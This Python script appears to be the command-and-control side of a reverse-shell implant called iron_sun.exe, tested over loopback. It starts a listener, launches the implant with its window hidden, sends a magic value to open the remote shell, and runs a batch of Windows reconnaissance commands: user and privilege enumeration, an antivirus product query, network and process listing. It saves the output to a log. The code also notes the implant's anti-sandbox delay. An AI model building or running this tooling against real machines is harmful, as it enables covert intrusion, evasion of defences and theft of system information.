#!/usr/bin/env python3
"""
iron-sun live test — loopback proof of concept.
Runs a C2 listener on 127.0.0.1:4443, launches iron_sun.exe,
sends ISUN magic, executes recon commands, logs and displays output.
"""
import sys, os, socket, threading, subprocess, time, datetime, shutil

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        os.environ.setdefault("PYTHONIOENCODING", "utf-8")

_IDF  = "\033[38;2;0;56;184m"
_GOLD = "\033[38;2;255;215;0m"
_GRN  = "\033[38;2;0;255;100m"
_RED  = "\033[38;2;255;60;60m"
_CY   = "\033[38;2;0;229;255m"
_WH   = "\033[38;2;255;255;255m"
_DIM  = "\033[38;2;100;100;100m"
_RS   = "\033[0m"

W = 66; C = W // 2

def print_banner():
    rows = []
    for r in range(15):
        h = int(round(C * (14 - r) / 14))
        if h == 0:
            ln = [' '] * W; ln[C] = '✡'; rows.append(''.join(ln)); break
        ln = [' '] * W
        for i in range(17):
            p = int(round(C + (-1.0 + i * 0.125) * h))
            p = max(0, min(W - 1, p))
            ln[p] = '│' if abs(p - C) <= 1 else ('╲' if p < C else '╱')
        rows.append(''.join(ln))
    print()
    print(f"  {_CY}╔{'═'*W}╗")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    for row in rows:
        print(f"  ║{_GOLD}{row.ljust(W)[:W]}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ║{_WH}{'T H E   I R O N - S U N'.center(W)}{_CY}║")
    print(f"  ║{_WH}{'A U S T R A L I A N   A R M Y   ·   2 2 D I V'.center(W)}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ║{_IDF}{'▓'*W}{_CY}║")
    print(f"  ╚{'═'*W}╝{_RS}")
    print()

RECON_CMDS = [
    ("IDENTITY",    "whoami /all"),
    ("HOSTNAME",    "hostname"),
    ("OS INFO",     "systeminfo | findstr /C:\"Host Name\" /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"Processor\" /C:\"Total Physical\""),
    ("NETWORK",     "ipconfig /all"),
    ("USERS",       "net user"),
    ("PROCESSES",   "tasklist /fo list | findstr /i \"Image Name:\""),
    ("AV CHECK",    "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /format:list"),
    ("LISTENING",   "netstat -an | findstr LISTEN"),
    ("DRIVES",      "wmic logicaldisk get caption,description,size,freespace"),
    ("CURRENT DIR", "dir C:\\Users\\"),
]

MAGIC = bytes([0x49, 0x53, 0x55, 0x4E])

captured = []
conn_event = threading.Event()
shell_conn = [None]

def listener_thread():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 4443))
    srv.listen(1)
    print(f"  {_GRN}[*]{_RS} Listener: 127.0.0.1:4443")
    print(f"  {_GRN}[*]{_RS} Waiting for iron_sun callback...")
    print()
    srv.settimeout(60)
    try:
        conn, addr = srv.accept()
        shell_conn[0] = conn
        print(f"  {_GRN}[+]{_RS} {_WH}CONNECTION FROM {addr[0]}:{addr[1]}{_RS}")
        conn.send(MAGIC)
        print(f"  {_GRN}[+]{_RS} ISUN magic sent — shell gate open")
        conn_event.set()
    except socket.timeout:
        print(f"  {_RED}[!]{_RS} Timeout — iron_sun did not connect in 60s")
        conn_event.set()
    finally:
        srv.close()

def recv_until_prompt(conn, timeout=8):
    conn.settimeout(0.3)
    data = b""
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            if data and (data.endswith(b">") or data.endswith(b"> ")):
                break
            if data and time.time() > deadline - 2:
                break
    return data.decode(errors='replace')

def run_recon(conn):
    time.sleep(0.5)
    # Drain the initial cmd.exe banner
    recv_until_prompt(conn, timeout=4)

    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n  {_CY}{'─'*W}{_RS}")
    print(f"  {_WH}IRON-SUN LIVE RECON — RADON — {ts}{_RS}")
    print(f"  {_CY}{'─'*W}{_RS}\n")

    log_lines = [f"# IRON-SUN LIVE RECON — {ts}\n# Machine: RADON\n"]

    for label, cmd in RECON_CMDS:
        print(f"  {_GOLD}[{label}]{_RS} {_DIM}{cmd}{_RS}")
        try:
            conn.send((cmd + "\r\n").encode())
            out = recv_until_prompt(conn, timeout=10)
            # Strip trailing prompt lines
            lines = out.splitlines()
            clean = [l for l in lines if l.strip() and not l.strip().endswith(">")]
            for l in clean:
                print(f"  {l}")
            log_lines.append(f"\n## {label}\n```\n{chr(10).join(clean)}\n```")
        except Exception as e:
            print(f"  {_RED}[ERR]{_RS} {e}")
        print()

    print(f"  {_CY}{'─'*W}{_RS}")
    print(f"  {_GRN}[+]{_RS} {_WH}RECON COMPLETE{_RS}")
    print(f"  {_CY}{'─'*W}{_RS}\n")

    # Save log
    log_path = os.path.join(os.path.dirname(__file__), "docs", "LIVE_RECON_radon.md")
    os.makedirs(os.path.dirname(log_path), exist_ok=True)
    with open(log_path, "w", encoding="utf-8") as f:
        f.write("\n".join(log_lines))
    print(f"  {_GRN}[*]{_RS} Recon log saved → docs/LIVE_RECON_radon.md")

    try:
        conn.send(b"exit\r\n")
    except Exception:
        pass
    conn.close()


if __name__ == "__main__":
    print_banner()

    iron_sun = os.path.join(os.path.dirname(os.path.abspath(__file__)), "iron_sun.exe")
    if not os.path.exists(iron_sun):
        print(f"  {_RED}[!]{_RS} iron_sun.exe not found — compile first")
        sys.exit(1)

    t = threading.Thread(target=listener_thread, daemon=True)
    t.start()
    time.sleep(0.5)

    print(f"  {_GRN}[*]{_RS} Launching iron_sun.exe (anti-sandbox: ~7-10s startup)...")
    proc = subprocess.Popen([iron_sun], creationflags=subprocess.CREATE_NO_WINDOW)

    conn_event.wait(timeout=90)

    if shell_conn[0]:
        run_recon(shell_conn[0])
        proc.terminate()
    else:
        print(f"  {_RED}[!]{_RS} No shell connection — check iron_sun.exe or Defender")
        proc.terminate()

    input(f"\n  {_CY}[PRESS ENTER TO CLOSE]{_RS}")
